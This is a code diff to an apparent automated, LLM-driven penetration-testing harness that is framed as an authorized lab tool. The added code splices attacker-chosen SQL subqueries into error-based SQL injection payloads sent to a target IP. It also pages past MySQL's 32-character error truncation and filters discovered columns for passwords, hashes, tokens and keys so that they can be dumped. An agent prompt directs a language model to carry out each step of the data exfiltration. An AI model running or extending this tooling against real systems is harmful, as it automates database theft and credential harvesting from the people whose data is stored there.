@@ -12873,13 +12873,132 @@ def _postex_run(command, ip, port):
 
 def _extract_injection_value(output):
     """Pull a REAL extracted value from post-ex output: the ~<value>~ an error-based payload
-    prints, or a uid=/root: token. None if the injection didn't return a computed value."""
+    prints. MySQL's XPATH error caps at 32 chars, so ALSO accept a truncated marker: ~<value>
+    followed by MySQL's own `...` truncation indicator inside the quoted error text (there is
+    no closing ~ in that case — the 32-char window ate it). None if no computed value."""
     import re as _re
-    m = _re.search(r"~([^~<\s][^~<]{0,300})~", output or "")
+    o = output or ""
+    # Full delimited value
+    m = _re.search(r"~([^~<\s][^~<]{0,300})~", o)
     if m and m.group(1).strip():
         return m.group(1).strip()
-    m = _re.search(r"(uid=\d+\([^)]+\)|root:[^\s:]*:0:0:)", output or "")
+    # Truncated: ~<up to ~31 chars>... inside the SQL error's quoted string
+    m = _re.search(r"'~([^~<']{1,32}?)\.\.\.'", o) or _re.search(r"~([^~<'\s]{1,32})\.\.\.", o)
+    if m and m.group(1).strip():
+        return m.group(1).strip()
+    m = _re.search(r"(uid=\d+\([^)]+\)|root:[^\s:]*:0:0:)", o)
     return m.group(1) if m else None
+
+
+# ── Composable POST-EX PRIMITIVES ──────────────────────────────────────────────────
+# Small skills that CHAIN together. Each primitive is a deterministic harness helper the
+# collect agent invokes by name — cutting the LLM out of curl-quoting/URL-encoding/paging
+# where it makes reliability-killing mistakes. Declared in postex_web.yaml under
+# `primitives:` (RAG-first) so the planner can retrieve them.
+
+
+def _postex_template_slot(command):
+    """Find the SUBQUERY SLOT in a corrected error-based payload — the `(...)` inside
+    `concat(0x7e, <SLOT>, 0x7e)` (or the URL-encoded 0x7e/%2C variant). Returns
+    (prefix, suffix, url_encoded) so the caller can splice a new subquery in cleanly, or
+    None if the command doesn't have the classic error-based shape."""
+    import re as _re, urllib.parse as _up
+    # URL-encoded shape: concat(0x7e,(<sub>),0x7e)  -> spaces %20, commas literal, parens literal
+    for pat in (r"(concat\(\s*0x7e\s*,\s*\()(.*?)(\)\s*,\s*0x7e\s*\))",
+                r"(concat%28\s*0x7e\s*%2C\s*%28)(.*?)(%29\s*%2C\s*0x7e\s*%29)"):
+        m = _re.search(pat, command, _re.I | _re.S)
+        if m:
+            old_sub = m.group(2)
+            # URL-encoded when EITHER the outer wrapper is encoded, OR the old subquery itself
+            # uses %-escapes (spaces as %20 is the tell-tale in a curl'd URL).
+            url_encoded = ("%28" in m.group(1)) or ("%2C" in m.group(1)) or ("%20" in old_sub) or ("%27" in old_sub)
+            return m.group(1), m.group(3), url_encoded, old_sub
+    return None
+
+
+def _postex_subquery_run(working_command, subquery, ip, port):
+    """Splice a NEW SQL subquery into the corrected exploit's template and run it. The LLM
+    only supplies SQL (no curl/quoting/encoding), which eliminates the whole class of
+    reliability errors ("stray quote", "wrong terminator", "malformed URL")."""
+    import urllib.parse as _up
+    slot = _postex_template_slot(working_command)
+    if not slot:
+        # Fallback: run the whole command as-is (nothing to splice)
+        return _postex_run(working_command, ip, port), None
+    prefix, suffix, url_encoded, _old = slot
+    sub = subquery
+    if url_encoded:
+        # Use quote (not quote_plus) so spaces become %20, not +
+        sub = _up.quote(subquery, safe="")
+    spliced = working_command.replace(prefix + _old + suffix, prefix + sub + suffix, 1)
+    return _postex_run(spliced, ip, port), spliced
+
+
+def _postex_autopage(working_command, subquery_expr, ip, port, chunk=32, max_chunks=16):
+    """Deterministically page a truncated error-based value. Error-based (updatexml/
+    extractvalue) caps the payload at ~32 chars, so a long value is silently truncated —
+    the LLM often forgets to page. The harness handles it: substring(<expr>,1,32),
+    substring(<expr>,33,32), … until <chunk chars or empty. Returns the concatenated value
+    (or None if the first chunk was empty). Wrap the SQL expr yourself if it needs a select."""
+    parts = []
+    for i in range(max_chunks):
+        offset = 1 + i * chunk
+        sub = f"SELECT substring({subquery_expr}, {offset}, {chunk})"
+        out, _ = _postex_subquery_run(working_command, sub, ip, port)
+        val = _extract_injection_value(out)
+        if not val:
+            break
+        parts.append(val)
+        if len(val) < chunk:      # last chunk (shorter than the window)
+            break
+    return "".join(parts) if parts else None
+
+
+def _postex_filter_secret_columns(cols_or_pairs, patterns=None):
+    """DETERMINISTIC harvest: given a comma-separated list of column names (or
+    'table.column' pairs), keep only the ones that match secret/password patterns from the
+    skill. Removes the LLM's chance to prioritize wrong."""
+    import re as _re
+    if patterns is None:
+        try:
+            from common import vuln_skills as _vs
+            st = (_vs.postex_collection() or {}).get("secret_targets") or {}
+            patterns = st.get("column_patterns") or []
+        except Exception:  # noqa: BLE001
+            patterns = ["pass", "pwd", "hash", "secret", "token", "api", "key", "cred", "auth"]
+    if not cols_or_pairs:
+        return []
+    items = [x.strip() for x in str(cols_or_pairs).split(",") if x.strip()]
+    pat = _re.compile("|".join(_re.escape(p) for p in patterns), _re.I)
+    return [x for x in items if pat.search(x.rsplit(".", 1)[-1])]
+
+
+def _postex_primitive_registry():
+    """Name -> callable + one-line description. This IS the set of composable skills the
+    collect agent can invoke by name. Declared in postex_web.yaml `primitives:` for RAG."""
+    return {
+        "sqli_subquery": (
+            "Splice a SQL SUBQUERY into the corrected error-based template and run it. "
+            "Args: {subquery}. Returns the ~value~ (or None). Use when you know the exact "
+            "subquery that will land the answer.",
+            lambda args, ctx: _postex_subquery_run(ctx["working_command"], args["subquery"],
+                                                   ctx["ip"], ctx["port"]),
+        ),
+        "sqli_autopage": (
+            "Deterministically page a TRUNCATED error-based value (default 32 chars). "
+            "Args: {expr} (SQL expression that would be the FROM/SELECT to page). Returns "
+            "the fully concatenated string. Use whenever the previous value came back at "
+            "~32 chars — the harness pages so you don't have to.",
+            lambda args, ctx: (_postex_autopage(ctx["working_command"], args["expr"],
+                                                ctx["ip"], ctx["port"]), None),
+        ),
+        "harvest_secret_columns": (
+            "Filter a comma-separated column list down to just the SECRET/PASSWORD ones "
+            "(pass/pwd/hash/secret/token/api/key/cred/auth). Args: {cols}. Returns the "
+            "filtered list — use to pick dump targets deterministically.",
+            lambda args, ctx: (_postex_filter_secret_columns(args.get("cols", "")), None),
+        ),
+    }
 
 
 def _analyze_and_correct_exploit(cve, ip, port, command, vuln_class, eid, run_id, model=None,
@@ -12931,29 +13050,36 @@ def _analyze_and_correct_exploit(cve, ip, port, command, vuln_class, eid, run_id
 
 
 def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, eid, run_id,
-                        model=None, session_cookie=None, max_iters=8):
-    """PHASE 2 — the data-collection agent. Given a CORRECTED, WORKING extraction payload, walk
-    the STAGED collection plan from the skill (tables -> columns -> row_counts -> data), reusing
-    the working payload and changing only the subquery. Each stage's result feeds the next.
-    Enumerates every output to fix/tweak. Returns {extracted, data, command, facts, discovered}."""
+                        model=None, session_cookie=None, max_iters=10):
+    """PHASE 2 — data-collection agent. INVOKES COMPOSABLE PRIMITIVES BY NAME (sqli_subquery,
+    sqli_autopage, harvest_secret_columns) rather than emitting curl commands directly. This
+    removes the whole class of LLM curl-quoting/URL-encoding errors — the LLM only picks the
+    primitive + the SQL subquery (or column list). Walks the staged collection plan
+    (tables -> columns -> hunt_secrets -> row_counts -> data). Returns
+    {extracted, data, command, facts, discovered}."""
     try:
         from common import vuln_skills as _vs
         coll = _vs.postex_collection() or {}
     except Exception:  # noqa: BLE001
         coll = {}
-    plan = coll.get("plan") or [
-        {"stage": "tables", "goal": "list all table names",
-         "subquery": "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"},
-        {"stage": "columns", "goal": "list the target table's columns",
-         "subquery": "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='<TABLE>'"},
-        {"stage": "row_counts", "goal": "count rows", "subquery": "SELECT COUNT(*) FROM <TABLE>"},
-        {"stage": "data", "goal": "dump the objective rows", "subquery": "SELECT group_concat(<COLS>) FROM <TABLE>"},
-    ]
+    plan = coll.get("plan") or []
     methodology = coll.get("methodology", "")
+    primitives = _postex_primitive_registry()
+    prim_catalog = "\n".join(f"  - {name}: {desc}" for name, (desc, _) in primitives.items())
     tgt = "http://%s:%s" % (ip, port)
     auth = ("Send this Cookie in every request: %s. " % session_cookie) if session_cookie else ""
-    facts = []
-    discovered = {"tables": None, "target_table": None, "columns": None, "row_count": None}
+
+    ctx = {"working_command": working_command, "ip": ip, "port": port}
+    slot = _postex_template_slot(working_command)
+    if not slot:
+        # No template shape -> primitives can't splice; fall through to a plain command.
+        facts = ["WARNING: corrected command doesn't fit the error-based template shape; "
+                 "primitives will fall back to running the full command as-is."]
+    else:
+        facts = ["template slot detected: primitives can splice new SQL cleanly"]
+
+    discovered = {"tables": None, "target_table": None, "columns": None,
+                  "secret_columns": None, "row_count": None}
     command = ""; output = ""; extracted = False; data = ""; llm_model = None
     stage_i = 0; attempts = 0; iters = 0
     while stage_i < len(plan) and iters < max_iters:
@@ -12961,59 +13087,98 @@ def _collect_data_agent(cve, ip, port, working_command, objective, vuln_class, e
         stage = plan[stage_i]
         sqlite_hint = (" (SQLite: %s)" % stage.get("sqlite")) if stage.get("sqlite") else ""
         prompt = (
-            "AUTHORIZED lab pentest DATA-COLLECTION agent, staged. The %s exploit is CORRECTED "
-            "and WORKING on %s. %s\n"
-            "Working payload (reuse its shape; change ONLY the subquery): %s\n"
+            "AUTHORIZED lab pentest DATA-COLLECTION agent. The %s exploit is CORRECTED and "
+            "WORKING on %s. %s\n"
+            "Working payload (do NOT rewrite it; the harness will splice your SQL in): %s\n"
             "Methodology: %s\n"
             "CURRENT STAGE: %s - %s\n"
             "Template subquery for this stage: %s%s\n"
             "Discovered so far: %s\n"
             "Objective: %s\n"
-            "Last output (ENUMERATE it):\n%s\n"
-            "Fill <TABLE>/<COLS> from the discovered facts, choosing the table/columns whose "
-            "names match the objective. Produce ONE curl for THIS stage.\n"
-            "Return ONE JSON only: {\"command\": \"<curl>\", "
-            "\"value\": \"<this stage's result if the LAST output already contains it, else empty>\", "
-            "\"target_table\": \"<the table you are targeting, if known>\", "
+            "Last output:\n%s\n"
+            "PRIMITIVES available (pick ONE per turn):\n%s\n"
+            "Rules: NEVER emit a curl command. Pick a PRIMITIVE and give its args (SQL "
+            "subquery or column list). If the previous value looked TRUNCATED at 32 chars, "
+            "use sqli_autopage. Fill <TABLE>/<COLS> from Discovered before you invoke.\n"
+            "Return ONE JSON only: {\"primitive\": \"<name>\", \"args\": {...}, "
+            "\"target_table\": \"<table you are targeting, if known>\", "
+            "\"stage_value\": \"<this stage's answer if the LAST output already contains "
+            "it, else empty>\", \"done\": <true iff the objective data is collected>, "
+            "\"extracted\": \"<final objective value if done>\", "
             "\"note\": \"<what you learned>\"}."
         ) % (vuln_class, tgt, auth, working_command, methodology, stage["stage"],
              stage.get("goal"), stage.get("subquery"), sqlite_hint, discovered, objective,
-             (output or "(none yet)")[:1500])
-        res = _llm_for_model(prompt, model=model, caller="postex_collect", num_predict=800)
+             (output or "(none yet)")[:1400], prim_catalog)
+        res = _llm_for_model(prompt, model=model, caller="postex_collect", num_predict=700)
         if isinstance(res, dict) and res.get("model"):
             llm_model = res["model"]
         j = _poc_extract_json(res.get("response", "") if isinstance(res, dict) else "") or {}
         if j.get("target_table"):
             discovered["target_table"] = str(j["target_table"])[:64]
-        note = str(j.get("note", ""))[:160]
+        note = str(j.get("note", ""))[:180]
         if note:
             facts.append("[%s] %s" % (stage["stage"], note))
-        val = j.get("value") or None
-        command = str(j.get("command") or "").strip()
-        if command:
-            output = _postex_run(command, ip, port)
+        # Terminal: agent claims the objective is collected
+        if j.get("done") and j.get("extracted"):
+            extracted = True; data = str(j["extracted"])[:2000]
+            _poc_trace(run_id, "collect_done", iteration=iters, response="objective collected: %s" % data[:200])
+            break
+        # Deterministic value from last output (previous stage's value_stage)
+        val = j.get("stage_value") or None
+        # Invoke the primitive
+        prim_name = str(j.get("primitive") or "").strip()
+        args = j.get("args") or {}
+        if prim_name and prim_name in primitives:
+            _desc, fn = primitives[prim_name]
+            try:
+                out_val, cmd_used = fn(args if isinstance(args, dict) else {}, ctx)
+                if cmd_used:
+                    command = cmd_used
+                # sqli_subquery returns (output_text, cmd); autopage returns (str, None);
+                # harvest_secret_columns returns (list, None).
+                if prim_name == "sqli_subquery":
+                    output = out_val or ""
+                    v = _extract_injection_value(output)
+                    if v:
+                        val = v
+                elif prim_name == "sqli_autopage":
+                    if out_val:
+                        val = out_val
+                        output = "AUTOPAGED: " + str(out_val)[:600]
+                elif prim_name == "harvest_secret_columns":
+                    if out_val:
+                        val = ",".join(out_val)
+                        output = "SECRET COLS: " + val[:400]
+                        discovered["secret_columns"] = val[:500]
+                _poc_trace(run_id, "primitive:" + prim_name, iteration=iters,
+                           prompt=str(args)[:300], response=(str(out_val) if out_val is not None else "")[:400])
+            except Exception as e:  # noqa: BLE001
+                facts.append("primitive %s failed: %s" % (prim_name, str(e)[:80]))
+        # Enumerate whatever came back (errors/tweaks feed forward)
+        if output:
             enum = _enumerate_postex_output(output)
             for f in enum["errors"]:
                 facts.append("FIX: " + f)
             for tw in enum["tweaks"]:
                 facts.append("TWEAK: " + tw)
-            val = _extract_injection_value(output) or val
-            _poc_trace(run_id, "collect_%s" % stage["stage"], iteration=iters, run_output=output,
-                       prompt=command, extra={"errors": enum["errors"], "value": val})
+        # Advance stage on real progress
         if val:
             facts.append("STAGE %s: %s" % (stage["stage"], str(val)[:100]))
             if stage["stage"] == "tables":
                 discovered["tables"] = str(val)[:500]
             elif stage["stage"] == "columns":
                 discovered["columns"] = str(val)[:500]
+            elif stage["stage"] == "hunt_secrets":
+                discovered["secret_columns"] = str(val)[:500]
             elif stage["stage"] == "row_counts":
                 discovered["row_count"] = str(val)[:40]
             elif stage["stage"] == "data":
                 data = str(val)[:2000]; extracted = True
+                break
             stage_i += 1; attempts = 0
         else:
             attempts += 1
-            if attempts >= 2:            # give up on this stage after 2 tries, move on
+            if attempts >= 2:
                 facts.append("STAGE %s: no result after 2 tries - advancing" % stage["stage"])
                 stage_i += 1; attempts = 0
     return {"extracted": extracted, "data": data, "command": command, "facts": facts,
